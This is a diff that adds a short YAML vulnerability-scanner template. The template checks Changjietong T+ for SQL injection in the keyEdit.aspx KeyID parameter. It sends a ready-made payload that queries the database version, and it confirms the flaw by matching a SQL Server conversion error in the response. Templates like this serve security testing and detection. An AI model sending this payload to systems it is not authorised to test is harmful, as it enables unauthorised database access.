@@ -1,0 +1,21 @@
+name: poc-yaml-changjietong-keyEdit-sql
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /tplus/UFAQD/keyEdit.aspx?KeyID=1%27%20and%201=(select%20@@version)%20--&preload=1
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+    expression: response.status == 200 && response.body.bcontains(b'转换成数据类型 int 时失败')
+
+expression: r0() 
+
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/139899808
+
